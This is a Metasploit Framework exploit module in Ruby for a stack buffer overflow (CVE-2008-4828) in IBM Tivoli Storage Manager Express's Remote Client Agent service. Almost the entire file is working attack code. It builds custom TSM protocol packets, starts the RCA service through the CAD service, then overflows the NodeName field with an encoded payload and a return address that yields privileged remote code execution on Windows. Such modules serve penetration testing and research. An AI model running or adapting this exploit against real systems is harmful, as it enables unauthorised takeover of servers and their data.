##
# $Id: ibm_tsm_rca_dicugetidentify.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IBM Tivoli Storage Manager Express RCA Service Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express Remote
				Client Agent service. By sending a "dicuGetIdentify" request packet containing a long
				NodeName parameter, an attacker can execute arbitrary code.

				NOTE: this exploit first connects to the CAD service to start the RCA service and obtain
				the port number on which it runs. This service does not restart.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2008-4828' ],
					[ 'OSVDB', '54232' ],
					[ 'BID', '34803' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					# wchar_t buf[1024];
					'Space'    => ((1024*2)+4),
					'BadChars' => '\x00',
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# this target should be pretty universal..
					# dbghelp.dll is shipped with TSM Express, and hasn't been kept up-to-date..
					[ 'IBM Tivoli Storage Manager Express 5.3.6.2', { 'Ret' => 0x028495d3 } ], # p/p/r dbghelp.dll v6.0.17.0
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 04 2009'))

		register_options( [ Opt::RPORT(1582) ], self.class )
	end


	def make_tsm_packet(op,data)
		pkt = ""
		if op > 0xff
			pkt << [0,8,0xa5,op,0xc+data.length].pack('nCCNN')
		else
			pkt << [data.length,op,0xa5].pack('nCC')
		end
		pkt << data
	end


	def explode_tsm_packet(buf)
		return nil if buf.length < 4
		len,op,magic = buf[0,4].unpack('nCC')
		return nil if magic != 0xa5
		if op == 0x08
			return nil if buf.length < 12
			op,len = buf[4,8].unpack('NN')
			data = buf[12,len]
		else
			data = buf[4,len]
		end

		return op,data
	end


	def extract_port(buf)
		op,data = explode_tsm_packet(buf)
		if op != 0x10300
			print_error("Invalid response verb from CAD service: 0x%x" % op)
			return nil
		end
		if data.length < 6
			print_error("Insufficient data from CAD service.")
			return nil
		end
		port_str_len = data[4,2].unpack('n')[0]
		if data.length < (24+port_str_len)
			print_error("Insufficient data from CAD service.")
			return nil
		end
		rca_port = data[24,port_str_len].unpack('n*').pack('C*').to_i
	end


	def exploit

		print_status("Trying target %s..." % target.name)

		# first get the port number
		query = [1].pack('n')
		query << "\x00" * 10
		data = make_tsm_packet(0x10200, query)

		connect
		print_status("Attempting to start the RCA service via the CAD service...")
		sock.put(data)
		buf = sock.get_once(-1, 10)
		disconnect

		rca_port = extract_port(buf)
		if not rca_port or rca_port == 0
			print_error("The RCA agent service was not started :(")
		else
			print_status("RCA Agent is now running on port %u" % rca_port)
		end


		# trigger the vulnerability
		copy_len = payload_space + 4
		sploit = rand_text(33)
		# start offset, length
		sploit[10,4] = [0,copy_len].pack('n*')
		# data to copy
		buf = payload.encoded
		# we need this special encoding to make it work..
		buf << [target.ret].pack('V').unpack('v*').pack('n*')
		# adjustment :)
		sploit << buf
		data = make_tsm_packet(0x10400, sploit)

		connect(true, { 'RPORT' => rca_port })
		print_status("Sending specially crafted dicuGetIdentifyRequest packet...")
		sock.write(data)

		print_status("Starting handler...")
		handler
		disconnect
	end

end
